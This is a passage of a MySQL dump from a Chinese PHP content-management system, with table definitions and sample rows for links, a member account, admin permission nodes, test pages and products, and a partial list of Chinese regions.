INSERT INTO `np_link` VALUES (1,'ECSHOP','','最大的开源网店系统',1,1,1,0,11,1,'http://www.ecshop.com/',1471508435,1471509575,NULL,'zh-cn'),(2,'wordpress','','wordpress比较强大的多主题源码',1,1,1,0,6,1,'https://wordpress.org/',1471508511,1471508511,NULL,'zh-cn'),(3,'haorooms','','',1,2,1,0,11,1,'http://www.haorooms.com/nav',1471508570,1471509302,NULL,'zh-cn'),(4,'dedecms','','织梦CMS',1,1,1,0,8,1,'http://www.dedecms.com/',1471511771,1471511771,NULL,'zh-cn'),(5,'discuz论坛','','最强大的的论坛源码',1,1,1,0,8,1,'http://www.discuz.net',1471511814,1471511814,NULL,'zh-cn'),(6,'zblog','','较好的博客源码',1,1,1,0,6,1,'https://www.zblogcn.com',1471511907,1471511914,NULL,'zh-cn'),(7,'Tipask问答源码','','Tipask问答源码',1,1,1,0,17,1,'http://www.tipask.com',1471511989,1471511989,NULL,'zh-cn'),(8,'PHPCMS','','PHPCMS V9内容管理系统',1,1,1,0,12,1,'http://www.phpcms.cn/',1471512073,1471512073,NULL,'zh-cn'),(9,'Bootstrap中文网','','简洁、直观、强悍的前端开发框架',1,2,1,0,32,1,'http://www.bootcss.com/',1471512234,1471512234,NULL,'zh-cn'),(10,'Font Awesome','','很全的图片字体库',1,2,1,0,8,1,'http://fontawesome.io/',1471512274,1471512274,NULL,'zh-cn'),(11,'Amaze Ui','','中国首个开源 HTML5 跨屏前端框架',1,2,1,0,12,1,'http://amazeui.org/',1471512314,1471512334,NULL,'zh-cn'),(12,'阿里妈妈图标库','','阿里妈妈图标库',1,2,1,0,6,1,'http://www.iconfont.cn/',1471512391,1471512391,NULL,'zh-cn'),(13,'jquery插件库','','jquery插件库，里面东西是免费下载的',1,2,1,0,12,1,'http://www.jq22.com/',1471512431,1471512444,NULL,'zh-cn'),(14,'jGestures','','jquery手势插件，功能强大，适合webapp开发！',1,2,1,0,28,1,'http://jgestures.codeplex.com/',1471512495,1471512495,NULL,'zh-cn'),(15,'w3school','','知识比较全面，易于新手学习和文档参考',1,2,1,0,10,1,'http://www.w3school.com.cn/',1471567444,1471567444,NULL,'zh-cn'),(16,'jQuery','','jQuery',1,2,1,0,6,1,'http://jquery.com/',1471567565,1471567565,NULL,'zh-cn'),(17,'nodejs','','nodejs官方网站',1,2,1,0,11,1,'https://nodejs.org/en/',1471567661,1471567661,NULL,'zh-cn'),(18,'懒人图库','','矢量图，网页素材！',1,3,1,0,8,1,'http://www.lanrentuku.com/',1471567908,1471567908,NULL,'zh-cn'),(19,'昵图网','','昵图网，起步最早的图片素材网站！',1,3,1,0,8,1,'http://www.nipic.com',1471567951,1471567951,NULL,'zh-cn'),(20,'千图网','','中国最大的免费图片网站！',1,3,1,0,10,1,'http://www.58pic.com/',1471567984,1471567984,NULL,'zh-cn'),(21,'站酷','','设计师互动平台！图片资源也不少！',1,3,1,0,6,1,'http://www.zcool.com.cn/',1471568007,1471568007,NULL,'zh-cn'),(22,'UI中国','','中国专业的界面设计平台！',1,3,1,0,6,1,'http://www.ui.cn/',1471568165,1471568165,NULL,'zh-cn'),(23,'素材中国','','2006年创办的中文素材网站',1,3,1,0,8,1,'http://www.sccnn.com/',1471568203,1471568203,NULL,'zh-cn'),(24,'MetInfo','','使用起来极其简单的CMS',1,1,1,0,11,1,'http://www.metinfo.cn/',1471568830,1479786997,NULL,'zh-cn');
/*!40000 ALTER TABLE `np_link` ENABLE KEYS */;

#
# Structure for table "np_member"
#

DROP TABLE IF EXISTS `np_member`;
CREATE TABLE `np_member` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL COMMENT '用户名',
  `password` varchar(32) NOT NULL COMMENT '密码',
  `email` varchar(40) NOT NULL COMMENT '邮箱',
  `realname` varchar(50) NOT NULL DEFAULT '' COMMENT '真实姓名',
  `nickname` varchar(50) NOT NULL DEFAULT '' COMMENT '昵称',
  `portrait` varchar(255) NOT NULL DEFAULT '' COMMENT '头像',
  `gender` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '性别',
  `birthday` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '生日',
  `province` smallint(5) NOT NULL DEFAULT '0' COMMENT '省',
  `city` smallint(5) NOT NULL DEFAULT '0' COMMENT '市',
  `area` smallint(5) NOT NULL DEFAULT '0' COMMENT '区',
  `address` varchar(255) NOT NULL DEFAULT '' COMMENT '地址',
  `phone` varchar(11) NOT NULL DEFAULT '' COMMENT '电话',
  `salt` char(6) NOT NULL COMMENT '佐料',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态',
  `last_login_ip` varchar(15) NOT NULL COMMENT '登录IP',
  `last_login_ip_attr` varchar(255) NOT NULL COMMENT '登录IP地区',
  `last_login_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '登录时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`),
  KEY `email` (`email`),
  KEY `phone` (`phone`),
  KEY `password` (`password`),
  KEY `gender` (`gender`),
  KEY `birthday` (`birthday`),
  KEY `province` (`province`),
  KEY `city` (`city`),
  KEY `area` (`area`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='会员';

#
# Data for table "np_member"
#

/*!40000 ALTER TABLE `np_member` DISABLE KEYS */;
INSERT INTO `np_member` VALUES (1,'levisun','5bba57291b6780ecb4f1724ef60f8822','','','','',1,0,0,0,0,'','','AAAAAA',1,'','',0,1478680173,1478680173);
/*!40000 ALTER TABLE `np_member` ENABLE KEYS */;

#
# Structure for table "np_message"
#

DROP TABLE IF EXISTS `np_message`;
CREATE TABLE `np_message` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `username` varchar(20) NOT NULL COMMENT '作者名',
  `content` varchar(500) NOT NULL COMMENT '内容',
  `reply` varchar(500) NOT NULL COMMENT '回复',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `mebmer_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '会员ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `ip` varchar(15) NOT NULL DEFAULT '' COMMENT '评论IP',
  `ip_attr` varchar(255) NOT NULL DEFAULT '' COMMENT '评论IP地区',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `lang` varchar(20) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='留言表';

#
# Data for table "np_message"
#

/*!40000 ALTER TABLE `np_message` DISABLE KEYS */;
INSERT INTO `np_message` VALUES (1,'1231111','1231111','1111','',16,0,0,0,'0.0.0.0','IANA保留地址',1481340968,1481340968,0,'zh-cn');
/*!40000 ALTER TABLE `np_message` ENABLE KEYS */;

#
# Structure for table "np_message_data"
#

DROP TABLE IF EXISTS `np_message_data`;
CREATE TABLE `np_message_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '留言ID',
  `fields_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `data` text NOT NULL COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`),
  KEY `fields_id` (`fields_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='留言扩展表';

#
# Data for table "np_message_data"
#


#
# Structure for table "np_model"
#

DROP TABLE IF EXISTS `np_model`;
CREATE TABLE `np_model` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '模型名',
  `table_name` varchar(255) NOT NULL COMMENT '表名',
  `remark` varchar(255) NOT NULL DEFAULT '' COMMENT '备注',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '状态',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  UNIQUE KEY `table_name` (`table_name`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='模型表';

#
# Data for table "np_model"
#

/*!40000 ALTER TABLE `np_model` DISABLE KEYS */;
INSERT INTO `np_model` VALUES (1,'article','article','文章模型',1,9),(2,'picture','picture','图片模型',1,8),(3,'download','download','下载模型',1,7),(4,'page','page','单页模型',1,6),(5,'feedback','feedback','反馈模型',1,5),(6,'message','message','留言模型',1,4),(7,'product','product','产品模型',1,3),(8,'link','link','友链模型',1,2),(9,'external','external','外部模型',1,1);
/*!40000 ALTER TABLE `np_model` ENABLE KEYS */;

#
# Structure for table "np_node"
#

DROP TABLE IF EXISTS `np_node`;
CREATE TABLE `np_node` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL COMMENT '节点操作名',
  `title` varchar(50) DEFAULT NULL COMMENT '节点说明',
  `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态',
  `remark` varchar(255) NOT NULL DEFAULT '' COMMENT '描述',
  `sort` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `pid` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '父ID',
  `level` tinyint(1) unsigned NOT NULL COMMENT '等级',
  PRIMARY KEY (`id`),
  KEY `level` (`level`),
  KEY `pid` (`pid`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=53 DEFAULT CHARSET=utf8 COMMENT='节点表';

#
# Data for table "np_node"
#

/*!40000 ALTER TABLE `np_node` DISABLE KEYS */;
INSERT INTO `np_node` VALUES (1,'admin','后台',1,'后台模块',0,0,1),(2,'Settings','设置',1,'设置控制器',1,1,2),(3,'info','系统信息',1,'系统信息方法',2,2,3),(4,'basic','基本设置',1,'基本设置方法',3,2,3),(5,'lang','语言设置',1,'语言设置方法',4,2,3),(6,'image','图片设置',1,'图片设置方法',5,2,3),(7,'safe','安全与效率设置',1,'安全与效率设置方法',6,2,3),(8,'email','邮件设置设置',1,'邮件设置方法',7,2,3),(9,'theme','界面',1,'界面控制器',1,1,2),(10,'template','网站界面设置',1,'网站界面设置方法',2,9,3),(11,'member','会员界面设置',1,'会员界面设置方法',3,9,3),(12,'shop','商城界面设置',1,'商城界面设置方法',4,9,3),(13,'category','栏目',1,'栏目控制器',1,1,2),(14,'category','管理栏目',1,'管理栏目方法',2,13,3),(15,'model','管理模型',1,'管理模型方法',3,13,3),(16,'fields','自定义字段',1,'自定义字段',4,13,3),(17,'type','管理类别',1,'管理类别方法',5,13,3),(18,'content','内容',1,'内容控制器',1,1,2),(19,'content','管理内容',1,'管理内容方法',2,18,3),(20,'banner','管理幻灯片',1,'管理幻灯片方法',3,18,3),(21,'ads','管理广告',1,'管理广告方法',4,18,3),(22,'comment','管理评论',1,'管理评论方法',5,18,3),(23,'cache','更新缓存或静态',1,'更新缓存或静态方法',6,18,3),(24,'recycle','内容回收站',1,'内容回收站方法',7,18,3),(25,'user','用户',1,'用户控制器',1,1,2),(26,'member','会员管理',1,'会员管理方法',2,25,3),(27,'level','会员等级管理',1,'会员等级管理方法',3,25,3),(28,'admin','管理员管理',1,'管理员管理方法',4,25,3),(29,'role','管理员组管理',1,'管理员组管理方法',5,25,3),(30,'node','系统节点管理',1,'系统节点管理方法',6,25,3),(31,'wechat','微信',1,'微信控制器',1,1,2),(32,'keyword','关键词自动回复',1,'关键词自动回复方法',2,31,3),(33,'auto','默认自动回复',1,'默认自动回复方法',3,31,3),(34,'attention','关注自动回复',1,'关注自动回复方法',4,31,3),(35,'config','接口配置',1,'接口配置方法',5,31,3),(36,'menu','自定义菜单',1,'自定义菜单方法',6,31,3),(37,'shop','商城',1,'商城控制器',1,1,2),(38,'goods','管理商品',1,'管理商品方法',2,37,3),(39,'orders','管理订单',1,'管理订单方法',3,37,3),(40,'category','管理商城导航',1,'管理商城导航方法',4,37,3),(41,'type','管理商品分类',1,'管理商品分类方法',5,37,3),(42,'brand','管理商品品牌',1,'管理商品品牌方法',6,37,3),(43,'comment','管理商品评论',1,'管理商品评论方法',7,37,3),(44,'accountwater','账户流水',1,'账户流水方法',8,37,3),(45,'settings','商城设置',1,'商城设置方法',9,37,3),(46,'expand','扩展',1,'扩展控制器',1,1,2),(47,'log','系统日志',1,'系统日志方法',2,46,3),(48,'databack','数据与备份',1,'数据与备份方法',3,46,3),(49,'upgrade','在线升级',1,'在线升级方法',4,46,3),(50,'elog','错误日志',1,'错误日志方法',5,46,3),(51,'visit','访问统计',1,'访问统计方法',6,46,3);
/*!40000 ALTER TABLE `np_node` ENABLE KEYS */;

#
# Structure for table "np_page"
#

DROP TABLE IF EXISTS `np_page`;
CREATE TABLE `np_page` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `keywords` varchar(255) NOT NULL DEFAULT '' COMMENT '关键词',
  `description` varchar(500) NOT NULL DEFAULT '' COMMENT '描述',
  `content` mediumtext NOT NULL COMMENT '内容',
  `thumb` varchar(255) NOT NULL DEFAULT '' COMMENT '缩略图',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `is_com` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '推荐',
  `is_top` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '置顶',
  `is_hot` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '最热',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `comment_count` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论量',
  `username` varchar(20) NOT NULL COMMENT '作者名',
  `origin` varchar(255) NOT NULL DEFAULT '' COMMENT '来源',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '发布人ID',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `is_link` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '跳转',
  `show_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '显示时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `access_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '访问权限',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `is_com` (`is_com`),
  KEY `is_top` (`is_top`),
  KEY `is_hot` (`is_hot`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='单页表';

#
# Data for table "np_page"
#

/*!40000 ALTER TABLE `np_page` DISABLE KEYS */;
INSERT INTO `np_page` VALUES (1,'关于我','','','&lt;p&gt;Hi，我是一员程序猿。&lt;/p&gt;&lt;p&gt;这里主要记录工作中遇到的问题，以及经验总结。&lt;/p&gt;&lt;p&gt;&lt;s&gt;还有最重要是测试自己写的这套PHP程序。&lt;/s&gt;&lt;/p&gt;&lt;p&gt;&amp;lt; &amp;gt; &amp;lowast; , &amp;quot; &amp;#39; = _ - |&lt;/p&gt;','',4,0,0,0,0,0,0,185,0,'','',1,'',0,0,1471513383,1481622441,NULL,6,'zh-cn');
/*!40000 ALTER TABLE `np_page` ENABLE KEYS */;

#
# Structure for table "np_page_data"
#

DROP TABLE IF EXISTS `np_page_data`;
CREATE TABLE `np_page_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '单页ID',
  `fields_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `data` text NOT NULL COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`),
  KEY `fields_id` (`fields_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='单页扩展表';

#
# Data for table "np_page_data"
#

/*!40000 ALTER TABLE `np_page_data` DISABLE KEYS */;
INSERT INTO `np_page_data` VALUES (1,1,5,'12321321321');
/*!40000 ALTER TABLE `np_page_data` ENABLE KEYS */;

#
# Structure for table "np_picture"
#

DROP TABLE IF EXISTS `np_picture`;
CREATE TABLE `np_picture` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `keywords` varchar(255) NOT NULL DEFAULT '' COMMENT '关键词',
  `description` varchar(500) NOT NULL DEFAULT '' COMMENT '描述',
  `content` mediumtext NOT NULL COMMENT '内容',
  `thumb` varchar(255) NOT NULL DEFAULT '' COMMENT '缩略图',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `is_com` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '推荐',
  `is_top` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '置顶',
  `is_hot` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '最热',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `comment_count` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论量',
  `username` varchar(20) NOT NULL COMMENT '作者名',
  `origin` varchar(255) NOT NULL DEFAULT '' COMMENT '来源',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '发布人ID',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `is_link` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '跳转',
  `show_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '显示时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `access_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '访问权限',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `is_com` (`is_com`),
  KEY `is_top` (`is_top`),
  KEY `is_hot` (`is_hot`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='图文表';

#
# Data for table "np_picture"
#

/*!40000 ALTER TABLE `np_picture` DISABLE KEYS */;
INSERT INTO `np_picture` VALUES (1,'测试标题','测试标题','测试标题','','',13,0,1,0,0,0,0,0,0,'','',1,'',0,0,1479890947,1479890947,NULL,0,'zh-cn'),(2,'测试标题','测试标题','测试标题','','',13,0,1,0,0,0,0,0,0,'','',1,'',0,0,1479891040,1479891040,NULL,0,'zh-cn'),(3,'测试标题','测试标题','测试标题','','',13,0,1,0,0,0,0,0,0,'','',1,'',0,0,1479891132,1479891132,NULL,0,'zh-cn');
/*!40000 ALTER TABLE `np_picture` ENABLE KEYS */;

#
# Structure for table "np_picture_album"
#

DROP TABLE IF EXISTS `np_picture_album`;
CREATE TABLE `np_picture_album` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '图文ID',
  `thumb` varchar(255) NOT NULL DEFAULT '' COMMENT '缩略图',
  `image` varchar(255) NOT NULL DEFAULT '' COMMENT '原图',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='图文相册表';

#
# Data for table "np_picture_album"
#

/*!40000 ALTER TABLE `np_picture_album` DISABLE KEYS */;
INSERT INTO `np_picture_album` VALUES (2,6,'./upload/album/20161129/cc00bc361dc4adca85dd8e5ae1e710ae_thumb.jpg','./upload/album/20161129/cc00bc361dc4adca85dd8e5ae1e710ae.jpg');
/*!40000 ALTER TABLE `np_picture_album` ENABLE KEYS */;

#
# Structure for table "np_picture_data"
#

DROP TABLE IF EXISTS `np_picture_data`;
CREATE TABLE `np_picture_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '图文ID',
  `fields_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `data` text NOT NULL COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`),
  KEY `fields_id` (`fields_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='图文扩展表';

#
# Data for table "np_picture_data"
#


#
# Structure for table "np_product"
#

DROP TABLE IF EXISTS `np_product`;
CREATE TABLE `np_product` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `keywords` varchar(255) NOT NULL DEFAULT '' COMMENT '关键词',
  `description` varchar(500) NOT NULL DEFAULT '' COMMENT '描述',
  `content` mediumtext NOT NULL COMMENT '内容',
  `thumb` varchar(255) NOT NULL DEFAULT '' COMMENT '缩略图',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `is_com` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '推荐',
  `is_top` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '置顶',
  `is_hot` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '最热',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `comment_count` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论量',
  `username` varchar(20) NOT NULL COMMENT '作者名',
  `origin` varchar(255) NOT NULL DEFAULT '' COMMENT '来源',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '发布人ID',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `is_link` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '跳转',
  `show_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '显示时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `access_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '访问权限',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `is_com` (`is_com`),
  KEY `is_top` (`is_top`),
  KEY `is_hot` (`is_hot`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='产品表';

#
# Data for table "np_product"
#

/*!40000 ALTER TABLE `np_product` DISABLE KEYS */;
INSERT INTO `np_product` VALUES (1,'测试标题','测试标题','测试标题','','',14,0,1,0,0,0,0,0,0,'','',1,'',0,0,1480036510,1480036510,NULL,0,'zh-cn');
/*!40000 ALTER TABLE `np_product` ENABLE KEYS */;

#
# Structure for table "np_product_album"
#

DROP TABLE IF EXISTS `np_product_album`;
CREATE TABLE `np_product_album` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '图文ID',
  `thumb` varchar(255) NOT NULL DEFAULT '' COMMENT '缩略图',
  `image` varchar(255) NOT NULL DEFAULT '' COMMENT '原图',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='产品相册表';

#
# Data for table "np_product_album"
#

/*!40000 ALTER TABLE `np_product_album` DISABLE KEYS */;
INSERT INTO `np_product_album` VALUES (3,1,'./upload/album/20161125/93367d643eeb73d2b405ff255b464c90_thumb.png','./upload/album/20161125/93367d643eeb73d2b405ff255b464c90.png');
/*!40000 ALTER TABLE `np_product_album` ENABLE KEYS */;

#
# Structure for table "np_product_data"
#

DROP TABLE IF EXISTS `np_product_data`;
CREATE TABLE `np_product_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '产品ID',
  `fields_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `data` text NOT NULL COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`),
  KEY `fields_id` (`fields_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='产品扩展表';

#
# Data for table "np_product_data"
#


#
# Structure for table "np_region"
#

DROP TABLE IF EXISTS `np_region`;
CREATE TABLE `np_region` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `pid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `name` varchar(120) NOT NULL DEFAULT '',
  `type` tinyint(1) NOT NULL DEFAULT '2',
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`),
  KEY `name` (`name`),
  KEY `type` (`type`)
) ENGINE=MyISAM AUTO_INCREMENT=3409 DEFAULT CHARSET=utf8 COMMENT='地区表';

#
# Data for table "np_region"
#

/*!40000 ALTER TABLE `np_region` DISABLE KEYS */;
INSERT INTO `np_region` VALUES (1,0,'中国',0),(2,1,'北京',1),(3,1,'安徽',1),(4,1,'福建',1),(5,1,'甘肃',1),(6,1,'广东',1),(7,1,'广西',1),(8,1,'贵州',1),(9,1,'海南',1),(10,1,'河北',1),(11,1,'河南',1),(12,1,'黑龙江',1),(13,1,'湖北',1),(14,1,'湖南',1),(15,1,'吉林',1),(16,1,'江苏',1),(17,1,'江西',1),(18,1,'辽宁',1),(19,1,'内蒙古',1),(20,1,'宁夏',1),(21,1,'青海',1),(22,1,'山东',1),(23,1,'山西',1),(24,1,'陕西',1),(25,1,'上海',1),(26,1,'四川',1),(27,1,'天津',1),(28,1,'西藏',1),(29,1,'新疆',1),(30,1,'云南',1),(31,1,'浙江',1),(32,1,'重庆',1),(33,1,'香港',1),(34,1,'澳门',1),(35,1,'台湾',1),(36,3,'安庆',2),(37,3,'蚌埠',2),(38,3,'巢湖',2),(39,3,'池州',2),(40,3,'滁州',2),(41,3,'阜阳',2),(42,3,'淮北',2),(43,3,'淮南',2),(44,3,'黄山',2),(45,3,'六安',2),(46,3,'马鞍山',2),(47,3,'宿州',2),(48,3,'铜陵',2),(49,3,'芜湖',2),(50,3,'宣城',2),(51,3,'亳州',2),(52,2,'北京',2),(53,4,'福州',2),(54,4,'龙岩',2),(55,4,'南平',2),(56,4,'宁德',2),(57,4,'莆田',2),(58,4,'泉州',2),(59,4,'三明',2),(60,4,'厦门',2),(61,4,'漳州',2),(62,5,'兰州',2),(63,5,'白银',2),(64,5,'定西',2),(65,5,'甘南',2),(66,5,'嘉峪关',2),(67,5,'金昌',2),(68,5,'酒泉',2),(69,5,'临夏',2),(70,5,'陇南',2),(71,5,'平凉',2),(72,5,'庆阳',2),(73,5,'天水',2),(74,5,'武威',2),(75,5,'张掖',2),(76,6,'广州',2),(77,6,'深圳',2),(78,6,'潮州',2),(79,6,'东莞',2),(80,6,'佛山',2),(81,6,'河源',2),(82,6,'惠州',2),(83,6,'江门',2),(84,6,'揭阳',2),(85,6,'茂名',2),(86,6,'梅州',2),(87,6,'清远',2),(88,6,'汕头',2),(89,6,'汕尾',2),(90,6,'韶关',2),(91,6,'阳江',2),(92,6,'云浮',2),(93,6,'湛江',2),(94,6,'肇庆',2),(95,6,'中山',2),(96,6,'珠海',2),(97,7,'南宁',2),(98,7,'桂林',2),(99,7,'百色',2),(100,7,'北海',2),(101,7,'崇左',2),(102,7,'防城港',2),(103,7,'贵港',2),(104,7,'河池',2),(105,7,'贺州',2),(106,7,'来宾',2),(107,7,'柳州',2),(108,7,'钦州',2),(109,7,'梧州',2),(110,7,'玉林',2),(111,8,'贵阳',2),(112,8,'安顺',2),(113,8,'毕节',2),(114,8,'六盘水',2),(115,8,'黔东南',2),(116,8,'黔南',2),(117,8,'黔西南',2),(118,8,'铜仁'